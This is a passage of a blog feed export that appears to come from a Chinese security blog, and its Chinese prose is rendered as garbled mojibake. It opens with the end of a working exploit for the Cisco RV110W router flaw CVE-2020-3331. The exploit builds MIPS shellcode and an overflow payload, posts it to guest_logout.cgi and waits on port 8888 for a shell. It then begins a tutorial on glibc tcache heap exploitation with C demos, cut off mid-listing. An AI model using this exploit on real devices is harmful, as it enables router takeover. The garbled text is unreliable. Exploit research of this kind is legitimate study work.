+= <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="string">&#x27;b&#x27;</span>*(<span class="number">85</span>-<span class="number">49</span>-<span class="number">4</span>)+p32(jmp_s0)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">pd2 = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:pd1,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        requests.post(url, data=pd2, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#åˆ›å»ºä¸€ä¸ªTCPæˆ–UDPå¥—æ¥å­—ä»¥æ¥æ”¶æ•°æ® </span></span><br><span class="line">thread.start_new_thread(attack,())</span><br><span class="line"><span class="comment">#å¼€å§‹ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œä»attackå‡½æ•°å¼€å§‹è¿è¡Œ </span></span><br><span class="line">io.wait_for_connection()</span><br><span class="line"><span class="comment">#é˜»å¡ç›´åˆ°å»ºç«‹è¿æ¥ </span></span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h4><p>è¢«<code>xuanxuan</code>è€å¸ˆå¸¦å‘çš„ç¬¬ä¸€ä¸ªçœŸå®çš„IOTè®¾å¤‡ï¼Œå¤ç°ä¹‹è·¯å¼‚å¸¸åå·ï¼Œä½†ä¸ç®¡æ€ä¹ˆæ ·æœ€ç»ˆè¿˜æ˜¯å¤ç°å‡ºæ¥äº†ï¼Œå­¦åˆ°ä¸å°‘çŸ¥è¯†ï¼Œä¸è¿‡è¿˜æœ‰ä¸€äº›ç»†èŠ‚é—®é¢˜è¿˜æ²¡è§£å†³ï¼Œåé¢æ…¢æ…¢çœ‹å§ï¼åŠ æ²¹ï¼Œè·¯è¿˜å¾ˆé•¿ï¼Œä»»é‡è€Œé“è¿œï¼</p><h4 id="0x04-å‚è€ƒæ–‡ç« "><a href="#0x04-å‚è€ƒæ–‡ç« " class="headerlink" title="0x04 å‚è€ƒæ–‡ç« "></a>0x04 å‚è€ƒæ–‡ç« </h4><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">æ€ç§‘è·¯ç”±å™¨ RV110W CVE-2020-3331 æ¼æ´å¤ç°</a></p><p><a href="https://www.anquanke.com/post/id/159183">360ä»£ç å«å£«å¸®åŠ©æ€ç§‘å…¬å¸ä¿®å¤å¤šä¸ªäº§å“é«˜å±å®‰å…¨æ¼æ´ï¼ˆé™„è¯¦ç»†æŠ€æœ¯åˆ†æï¼‰</a></p><p><a href="https://la13x.github.io/2021/08/31/Real-World-Cisco-RV110W/#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">å¼ºç½‘æ¯2020å†³èµ› Cisco RV110Wè·¯ç”±å™¨å¤ç°</a></p><p><a href="https://xiaoxin.zone/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/">æ€ç§‘è·¯ç”±å™¨RV110W-CVE-2020-3331/CVE-2020-3323æ¼æ´å¤ç°</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tache bin attack</title>
      <link href="/2021/10/05/tache-bin-attack/"/>
      <url>/2021/10/05/tache-bin-attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸€ç›´ä»¥æ¥éƒ½æ˜¯åš<code>libc-2.23</code>çš„å †é¢˜ï¼Œ<code>tache</code>ä¹Ÿå¾ˆå°‘æ¶‰åŠï¼Œè¿™æ¬¡æ¥ç³»ç»Ÿçš„çœ‹ä¸€ä¸‹<code>tache</code>è¿™ä¸ªåœ¨<code>libc-2.26</code>ç‰ˆæœ¬ä¸­æ–°å¼•å…¥çš„æœºåˆ¶åˆ°åº•æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿå®ƒæœ‰ä»€ä¹ˆå¥‡å¦™çš„ç©æ³•ï¼Ÿä¸€èµ·æ¥çœ‹çœ‹å§</p></blockquote><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>tacheæ–°å¢äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œä¸€ä¸ªæ˜¯ <strong>tcache_entry</strong> ï¼Œå¦ä¸€ä¸ªæ˜¯<strong>tcache_perthread_struct</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªç‰¹åˆ«é‡è¦çš„å‡½æ•°ï¼Œæ˜¯å…³äº<code>tache</code>é“¾å…¥å’Œè„±é“¾çš„æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°<code>tache</code>é“¾å…¥å’Œè„±é“¾çš„æ£€æŸ¥ååˆ†çš„å°‘ï¼Œè·Ÿ<code>fastbin</code>ç›¸æ¯”çœŸçš„ä¸å¤šï¼Œç”šè‡³å¯ä»¥è¯´æ²¡æœ‰æ£€æŸ¥â€¦ï¼Œæ‰€ä»¥è¯´<code>tache</code>çš„å­˜åœ¨è®©å †åˆ©ç”¨æ›´ç®€å•äº†ä¸€ç‚¹ï¼Œæ‰€ä»¥è¯´ä¸è¦æ€•ï¼Œå®ƒå¹¶ä¸å¯æ€•ï¼</p><ul><li><code>fastbin</code>æœ‰å¯¹<code>size</code>è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœ<code>size</code>ä¸åŒæ”¾åœ¨åŒä¸€ä¸ªé“¾è¡¨é‡Œé¢å°±ä¼šæŠ¥é”™ï¼Œ<code>tache</code>æ²¡å¾—</li><li><code>fastbin</code>æœ‰<code>double free</code>æ£€æŸ¥ï¼Œåœ¨æ—©æœŸçš„<code>tache</code>ä¸­ä¹Ÿæ²¡æœ‰</li></ul><p>é“¾å…¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è„±é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå†™ä¸ª<code>demo</code>ç®€å•è®¤è¯†ä¸€ä¸‹<code>tache</code>åœ¨<code>bin</code>ä¸­çš„æ€ä¹ˆæ ·çš„â€¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//æŸ¥çœ‹tache</span></span><br><span class="line"><span class="keyword">void</span> *chunk_1,*chunk_2,*chunk_3,*chunk_4;</span><br><span class="line"><span class="keyword">void</span> *chunk_5,*chunk_6,*chunk_7;</span><br><span class="line"></span><br><span class="line">chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">chunk_4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk_5 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">chunk_6 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">chunk_7 = <span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_1);</span><br><span class="line"><span class="built_in">free</span>(chunk_2);</span><br><span class="line"><span class="built_in">free</span>(chunk_3);</span><br><span class="line"><span class="built_in">free</span>(chunk_4);</span><br><span class="line"><span class="built_in">free</span>(chunk_5);</span><br><span class="line"><span class="built_in">free</span>(chunk_6);</span><br><span class="line"><span class="built_in">free</span>(chunk_7);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//å®å®šä¹‰define TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åçœ‹<code>bin</code>ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>fastbin</code>å·²ç»æœ‰äº†ä¸€ä¸ªå †å—ï¼Œè¯´æ˜<code>tache</code>æœ€å¤šåªèƒ½å­˜æ”¾7ä¸ªå †å—ï¼Œè¿™ä¹Ÿæ˜¯<code>tache</code>å¯ç©çš„æœºåˆ¶ä¹‹ä¸€</p><img src="/2021/10/05/tache-bin-attack/1.png" class=""><p>è¿˜è®°å¾—<code>tcache_perthread_struct</code>è¿™ä¸ªç»“æ„ä½“å—ï¼Ÿç³»ç»Ÿä¸ºå®ƒåˆ†é…äº†ä¸€ä¸ª0x250çš„å †å—æ¥å­˜æ”¾è¿™ä¸ªç»“æ„ä½“çš„å†…å®¹ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹é‡Œé¢çš„å†…å®¹ï¼Œä¸Šé¢çš„å°æ¡†æ¡†æ˜¯è®°å½•å †å—æ•°é‡çš„ï¼Œä»0x20å¼€å§‹ä¸€ç›´åˆ°0x400ï¼Œä¸€èˆ¬çš„åˆ©ç”¨ä¹Ÿåˆ°ä¸äº†0x400ï¼Œæ‰€ä»¥å°±æ²¡å±•ç¤ºï¼Œä¸‹é¢çš„å¤§æ¡†æ¡†å°±æ˜¯å„ä¸ªå¤§å°çš„å †å—é¦–ä¸ªå †å—çš„åœ°å€ï¼Œå¯ä»¥å¯¹æ¯”ä¸Šå›¾æ¥çœ‹</p><img src="/2021/10/05/tache-bin-attack/2.jpg" class=""><p>å¼•ç”¨wikiä¸Šçš„ä¸€æ®µè¯</p><blockquote><p>åœ¨å†…å­˜åˆ†é…çš„<code>malloc</code>å‡½æ•°ä¸­æœ‰å¤šå¤„ï¼Œä¼šå°†å†…å­˜å—ç§»å…¥<code>tcache</code>ä¸­ã€‚</p><p>ï¼ˆ1ï¼‰é¦–å…ˆï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ<code>fastbin</code>å¤§å°æ—¶å¹¶ä¸”åœ¨<code>fastbin</code>å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥<code>fastbin</code>é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥<code>tcache</code>ä¸­ã€‚</p><p>ï¼ˆ2ï¼‰å…¶æ¬¡ï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ<code>smallbin</code>å¤§å°æ—¶å¹¶ä¸”åœ¨<code>smallbin</code>å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥<code>smallbin</code>é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥<code>tcache</code>ä¸­ã€‚</p><p>ï¼ˆ3ï¼‰å½“åœ¨<code>unsorted bin</code>é“¾ä¸Šå¾ªç¯å¤„ç†æ—¶ï¼Œå½“æ‰¾åˆ°å¤§å°åˆé€‚çš„é“¾æ—¶ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯å…ˆæ”¾åˆ°<code>tcache</code>ä¸­ï¼Œç»§ç»­å¤„ç†ã€‚</p></blockquote><p>å…¶å®ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯åˆ†é…çš„æ—¶å€™ä¼šå…ˆä»<code>tache</code>ä¸­å–ï¼Œç„¶åæŠŠç¬¦åˆå¯¹åº”å¤§å°çš„å †å—çš„æ•´ç†åˆ°<code>tache</code>ä¸­ï¼Œæ”¹ä¸€ä¸‹ä¸Šé¢çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//æ–­ç‚¹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹æ–­ç‚¹ä¹‹åï¼Œå‘ç°<code>malloc</code>ä¸‰ä¸ªå †å—<code>fastbin</code>é‡Œé¢ä¸€ä¸ªéƒ½æ²¡åŠ¨ï¼Œå…¨éƒ¨éƒ½æ˜¯<code>tache</code>é‡Œé¢æ‹¿çš„</p><img src="/2021/10/05/tache-bin-attack/3.png" class=""><p>ä½†æ˜¯<code>tache</code>é‡Œé¢çš„æ‹¿å®Œäº†ä¹‹åï¼Œå®ƒå°±ä¼šå»<code>fastbin</code>é‡Œé¢æ‹¿ï¼Œæ‹¿äº†ä¹‹åè¿˜æ²¡å®Œè¿˜è¦æŠŠ<code>fastbin</code>é‡Œé¢çš„å †å—æ”¾åˆ°<code>tache</code>é‡Œé¢å»ï¼Œä¸‹é¢æ˜¯ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//tacheé‡Œé¢å·²ç»åˆ†é…å®Œ</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/4.png" class=""><p>è®²å®Œäº†<code>tache</code>çš„ä¸€äº›åŸç†æ€§çš„ä¸œè¥¿ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹å¦‚ä½•æ”»å‡»çš„ï¼š</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>æ‹¿<code>how2heap</code>çš„ä»£ç æ¥æ¼”ç¤ºï¼Œç›®çš„æ˜¯ä»»æ„åœ°å€åˆ†é…ï¼Œåˆ†é…åˆ°æ ˆä¸Šçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">    